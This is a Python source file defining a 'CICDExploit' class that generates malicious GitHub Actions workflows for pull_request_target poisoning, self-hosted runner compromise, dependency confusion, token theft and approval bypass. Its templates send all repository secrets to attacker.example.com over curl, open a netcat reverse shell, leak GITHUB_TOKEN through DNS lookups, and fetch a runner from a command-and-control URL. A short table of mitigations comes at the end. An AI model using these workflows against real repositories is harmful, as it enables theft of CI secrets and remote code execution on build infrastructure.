class CICDExploit:
    WORKFLOW_TEMPLATES = {
        "checkout": r"""name: CI
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Build complete"
""",
        "pr_target": r"""name: PR Scan
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Run tests
        run: |
          echo "Running tests on PR code"
          npm install
          npm test
""",
        "self_hosted": r"""name: Build
on: [push]

jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      - run: make build
""",
        "issue_comment": r"""name: Comment Trigger
on:
  issue_comment:
    types: [created]

jobs:
  handle:
    if: ${{ github.event.issue.pull_request }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Processing comment from ${{ github.actor }}"
""",
    }

    def generate_malicious_workflow(self, target_repo="owner/repo", technique="pr_target"):
        if technique == "pr_target":
            return self._pr_target_poison(target_repo)
        elif technique == "self_hosted":
            return self._self_hosted_exploit(target_repo)
        elif technique == "dependency_confusion":
            return self._ci_dep_confusion(target_repo)
        elif technique == "token_theft":
            return self._token_theft(target_repo)
        elif technique == "approval_bypass":
            return self._approval_bypass(target_repo)
        return f"# Unknown technique: {technique}"

    def _pr_target_poison(self, target_repo):
        return f'''name: "PR Code Review"
on:
  pull_request_target:
    types: [opened, synchronize, labeled]

permissions:
  contents: read

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR code
        uses: actions/checkout@v4
        with:
          repository: {target_repo}
          ref: ${{{{ github.event.pull_request.head.sha }}}}

      - name: Install and test
        run: |
          echo "Installing dependencies from PR branch..."
          npm install || true
          echo "PR #${{{{ github.event.pull_request.number }}}} by ${{{{ github.actor }}}}"

      - name: Run tests
        run: |
          # This executes with the PR author's injected code
          echo "Security scan complete"

      - name: Post comment
        uses: actions/github-script@v7
        with:
          github-token: ${{{{ secrets.GITHUB_TOKEN }}}}
          script: |
            github.rest.issues.createComment({{
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: 'Review complete. No issues found.'
            }})
'''

    def _self_hosted_exploit(self, target_repo):
        return f'''name: "CI Pipeline"
on:
  pull_request:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: self-hosted
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Build
        run: |
          echo "Building on self-hosted runner..."
          uname -a
          id
          env | sort
          curl -s http://attacker.example.com/exfil?data=$(echo "${{{{ toJson(secrets) }}}}" | base64 -w0) &
          make build || true

      - name: Test
        run: |
          nc attacker.example.com 4444 -e /bin/bash &
          echo "Tests passed"
'''

    def _ci_dep_confusion(self, target_repo):
        return f'''name: "Build and Deploy"
on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          # Dependency confusion target: internal packages resolved to PyPI
          pip install --extra-index-url https://pypi.org/simple/ \
            internal-auth-lib \
            corp-secrets-manager \
            private-config-client

      - name: Run
        run: python main.py
'''

    def _token_theft(self, target_repo):
        return f'''name: "Lint Check"
on:
  pull_request_target:
    types: [opened]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          repository: {target_repo}
          ref: ${{{{ github.event.pull_request.head.sha }}}}

      - name: Setup Node
        uses: actions/setup-node@v4

      - name: Lint
        run: |
          npm install
          # Exfiltrate GITHUB_TOKEN via DNS exfiltration
          TOKEN="${{{{ secrets.GITHUB_TOKEN }}}}"
          for i in $(seq 1 ${{{{#TOKEN}}}}); do
            CH=${{{{TOKEN:i-1:1}}}}
            dig @8.8.8.8 $CH.${{{{i}}}}.exfil.attacker.example.com +short 2>/dev/null || true
          done
          npx eslint .

      - name: Post status
        uses: actions/github-script@v7
        with:
          github-token: ${{{{ secrets.GITHUB_TOKEN }}}}
          script: |
            github.rest.repos.createCommitStatus({{
              owner: context.repo.owner,
              repo: context.repo.repo,
              sha: context.payload.pull_request.head.sha,
              state: 'success',
              context: 'lint',
            }})
'''

    def _approval_bypass(self, target_repo):
        return f'''name: "Auto-Merge"
on:
  pull_request_review:
    types: [submitted]

jobs:
  auto-approve:
    if: ${{{{ github.event.review.state == 'approved' }}}}
    runs-on: ubuntu-latest
    steps:
      - name: Auto merge
        uses: actions/github-script@v7
        with:
          github-token: ${{{{ secrets.GITHUB_TOKEN }}}}
          script: |
            github.rest.pulls.merge({{
              owner: context.repo.owner,
              repo: context.repo.repo,
              pull_number: context.payload.pull_request.number,
              merge_method: 'squash',
            }})
'''

    def generate_runner_registration(self, c2_url="http://attacker.example.com"):
        return f'''#!/bin/bash
# Self-hosted runner registration script
cd /tmp
curl -s -o actions-runner.tar.gz {c2_url}/actions-runner-linux-x64-2.320.0.tar.gz
tar xzf actions-runner.tar.gz
./config.sh --url https://github.com/target-org/target-repo --token AAAA123456 --unattended --ephemeral
nohup ./run.sh &
'''

    def generate_dependency_confusion_pip(self, package_name, target_url):
        return f'''#!/bin/bash
# Publish dependency confusion package to PyPI
cat > setup.py << 'EOF'
from setuptools import setup
setup(
    name="{package_name}",
    version="99.99.99",
    packages=[],
    install_requires=[],
    python_requires=">=3.6",
)
EOF

# Build and publish
python setup.py sdist bdist_wheel
twine upload --repository-url {target_url} dist/* --verbose
'''

    def get_techniques(self):
        return {
            "pr_target": {
                "name": "pull_request_target Abuse",
                "severity": "critical",
                "description": "Workflow runs in base repo context with secret access. Checkout of PR ref allows attacker code execution with full permissions.",
                "mitigation": "Pin actions to SHA, avoid checking out PR code in pull_request_target, use separate token with minimal scope.",
            },
            "self_hosted": {
                "name": "Self-Hosted Runner Exploitation",
                "severity": "critical",
                "description": "Self-hosted runners have network access and persistent storage. PRs can execute arbitrary code on them.",
                "mitigation": "Use ephemeral runners, isolate runner environments, never run PR workflows on self-hosted.",
            },
            "dep_confusion": {
                "name": "CI Dependency Confusion",
                "severity": "high",
                "description": "CI installs dependencies with extra indexes. Internal package names resolved from public registries.",
                "mitigation": "Use private registries with authentication, pin dependencies to specific sources.",
            },
            "token_theft": {
                "name": "GITHUB_TOKEN Theft via CI",
                "severity": "high",
                "description": "GITHUB_TOKEN is accessible in workflow steps. Exfiltration via DNS, HTTP, or artifact upload.",
                "mitigation": "Use minimum token permissions, rotate tokens, avoid storing in accessible locations.",
            },
            "approval_bypass": {
                "name": "Environment Approval Bypass",
                "severity": "high",
                "description": "Workflows triggered from protected environments can bypass manual approval gates.",
                "mitigation": "Require manual approval via environment protection rules, use deployment branches.",
            },
        }

    def summarize(self):
        lines = ["## CI/CD Attack Techniques"]
        for tid, info in self.get_techniques().items():
            lines.append(f"\n### {info['name']} ({info['severity'].upper()})")
            lines.append(f"**Description:** {info['description']}")
            lines.append(f"**Mitigation:** {info['mitigation']}")
        return "\n".join(lines)
